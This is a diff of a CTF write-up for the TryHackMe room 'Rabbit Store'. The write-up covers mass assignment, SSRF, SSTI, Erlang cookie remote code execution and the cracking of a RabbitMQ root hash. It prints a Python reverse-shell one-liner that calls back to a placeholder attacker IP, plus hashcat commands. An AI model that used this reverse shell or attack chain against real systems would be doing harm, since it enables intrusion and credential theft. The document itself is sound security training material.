@@ -13,6 +13,9 @@ type: "post"
 * Link: [Rabbit Store](https://tryhackme.com/room/rabbitstore)
 * Level: Medium
 * OS: Linux
+---
+
+Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass assignment vulnerability in an API, which is then leveraged alongside an SSRF vulnerability to retrieve the API documentation. One of the discovered endpoints is vulnerable to SSTI, allowing us to gain initial access to the target system. Through enumeration, we uncover an Erlang cookie, enabling us to pivot to another user. From there, we escalate our privileges by creating an admin user in RabbitMQ and exporting a file containing sensitive information, including the root user’s password hash. By properly formatting the hash, we ultimately retrieve the root password and achieve full system compromise.
 
 ## Scanning
 
@@ -74,7 +77,7 @@ We find four open ports with Nmap:
 
 We use `nc -vz {TARGET_IP} 25672` to verify the status of `RabbitMQ`.
 
-![[rabbitMQ_test.png]]
+![RabbitMQ service test](/images/THM-RabbitStore/rabbitMQ_test.png)
 
 The output strongly suggests that `RabbitMQ` is running on the target. 
 
@@ -118,6 +121,8 @@ We discover a few more but we cannot access the last two:
 
 ![access denied to /api/uploads](/images/THM-RabbitStore/api_uploads.png)
 
+### Mass Assignment vulnerability
+
 We use [jwt.io](https://jwt.io/) to analyze the token. We indeed see that our subscription is marked as `inactive` in the decoded payload.
 
 ![decoded JWT](/images/THM-RabbitStore/decoded_JWT.png)
@@ -134,13 +139,15 @@ We login and now have access to `http://storage.cloudsite.thm/dashboard/active`,
 
 > The vulnerability we exploited is known as a mass assignment vulnerability. It occurs when an API allows the modification of fields that should not be directly manipulated by users, such as sensitive or internal attributes. 
 
+### Exploiting SSRF
+
 We can upload a file from our computer or from an url.
 
 ![access to /dashboard/active](/images/THM-RabbitStore/dashboard_active.png)
 
 ![upload files from url option](/images/THM-RabbitStore/upload_url.png)
 
- A feature accepting a user submitted URL can possibly mean a SSRF vulnerability so let's test that.
+A feature accepting a user submitted URL can possibly mean an SSRF vulnerability so let's test that.
 
 We create a test file and start a python server on our local machine.
 
@@ -191,6 +198,8 @@ The request is successful but the file downloaded only contains a `404` error.
 
 ![downloaded file contains 404 error](/images/THM-RabbitStore/404_file_dl.png)
 
+#### SSRF Internal Port Scanning
+
 Let's try to find some internal open ports on the target.
 
 > The same method is used in [THM: Creative](https://scorpiosec.com/posts/thm-creative/#ssrf-internal-port-scanning).
@@ -224,13 +233,15 @@ This time we get the correct file, detailing all the API endpoints. We already k
 
 ![Successfully retrieve /api/docs](/images/THM-RabbitStore/api_docs_file.png)
 
+### Exploiting SSTI 
+
 The file tells us that we need to use a POST request to access it. So let's first capture the request to `http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot`.
 
 As expected we get `GET method not allowed`.
 
 ![GET request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/GET_chatbot.png)
 
-We change it to a POST request a send it again now we have a 500 error.
+We change it to a POST request a send it again, now we have a 500 error.
 
 ![http 500 error to POST request](/images/THM-RabbitStore/internal_error_chatbot.png)
 
@@ -244,13 +255,15 @@ There is probably some kind of template akin to this: `Sorry, $username, our cha
 
 ![successful POST request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/chatbot_response.png)
 
-We will test for a SSTI (Server Side Template Injection) vulnerability. On [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify) we find plenty of payloads.
+We will test for an SSTI (Server Side Template Injection) vulnerability. On [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify) we find plenty of payloads.
 
 The payload is indeed executed!
 
 ![SSTI confirmed](/images/THM-RabbitStore/SSTI_confirmed.png)
 
-Although the payload works I am wondering why that is the case {?:}thinking: 
+## Initial Foothold (shell as azrael)
+
+Although the payload works I am wondering why that is the case :thinking:.
 
 Because this application uses the Express framework and `{{7*7}}` is a payload for `Jinja2 (Python)`.
 
@@ -276,14 +289,18 @@ stty rows 38 columns 116
 
 ![foothold and user flag](/images/THM-RabbitStore/user_flag.png)
 
+### Shell as rabbitmq
+
 Linpeas finds an Erlang file called `.erlang.cookie` in `/var/lib/rabbitmq/`. The file is owned by the `rabbitmq` user.
+
+![Erlang file found](/images/THM-RabbitStore/erlang_file.png)
 
 We recall from our nmap scan that we found ports `4369` and `25672` open.
 
 On [this HackTricks page](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection) we learn a few methods to achieve RCE using the Erlang cookie. However we need to slightly modify the command, instead of `couchdb@localhost` we use `rabbit@forge` (forge is the target hostname).
 
 ```
-HOME=/ erl -sname kscorpio -setcookie NGBjea1ImuBmrIJH
+HOME=/ erl -sname kscorpio -setcookie CCOKIE_FOUND
 
 
 rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\", PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
@@ -317,6 +334,8 @@ We get the message:
 The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.
 ```
 
+## Privilege Escalation (shell as root)
+
 We learn [here](https://www.rabbitmq.com/docs/definitions) that RabbitMQ stores information in `definitions`, these files can be exported as a JSON file. We can abuse our privileges to create a new user and do just that.
 
 ```
@@ -332,7 +351,7 @@ Inside the file we find the root password hash.
 
 ![root password hash in json file](/images/THM-RabbitStore/rabbitmq_pwd_hash.png)
 
-To crack a RabbitMQ hash with a tool like hashcat we need to format it first. On [this Github issue page](https://github.com/QKaiser/cottontail/issues/27) we learn how to format it. 
+To crack a RabbitMQ hash with a tool like hashcat we need to format it first. On [this Github issue page](https://github.com/QKaiser/cottontail/issues/27) we learn how to do it. 
 
 ```
 echo "RABBITMQ_HASH" | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
@@ -345,14 +364,19 @@ hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
 
 The documentation [here](https://www.rabbitmq.com/docs/passwords#hash-via-http-api) let us know that the hashes use a `32 bit` (4 bytes) salt and we know that: "the password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password".
 
-So the password is simply what we have left after we remove the first 8 characters from the formatted hash we got earlier. We use it and are able to read the root flag.
+So the password is simply all the characters minus the salt (our formatted hash has already separated the two for us). We use it and are able to read the root flag.
+
+![root password](/images/THM-RabbitStore/root_pwd.png)
+
 
 ![access to the root account](/images/THM-RabbitStore/root_flag.png)
 
 ## Additional Resources
 
-* Learn about mass assignment vulnerabilities with PortSwigger [here](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
+This room is a great introduction to some novel exploitation (at least for me). Below are some additional resources to practice the featured vulnerabilities:
+
+* Learn about mass assignment vulnerabilities with PortSwigger [here](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability).
 * Learn about [SSRF](https://portswigger.net/web-security/ssrf) and [SSTI](https://portswigger.net/web-security/server-side-template-injection) from PortSwigger.
-* Erlang Cookie RCE methods are available [here](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection)
+* Erlang Cookie RCE methods are available [here](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection).
 
 
